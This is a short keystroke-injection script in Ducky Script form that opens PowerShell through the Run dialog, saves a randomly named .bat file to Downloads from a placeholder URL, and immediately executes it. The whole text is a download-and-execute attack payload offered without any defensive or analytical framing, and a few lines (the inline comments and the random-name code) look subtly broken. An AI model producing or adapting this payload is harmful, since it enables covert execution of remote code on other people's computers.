DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 2000  # Increased delay to allow PowerShell to fully open

STRING $filename = -join ((65..90) + (97..122) | Get-Random -Count 8) + '.bat'
ENTER
DELAY 500

STRING $filepath = "$env:USERPROFILE\Downloads\$filename"
ENTER
DELAY 500

STRING Invoke-WebRequest -Uri "DOWNLOAD URL example: github.com/example/example/main/subscribe.bat" -OutFile $filepath
ENTER
DELAY 3000  # Increased delay to ensure download completes

STRING Start-Process $filepath
ENTER
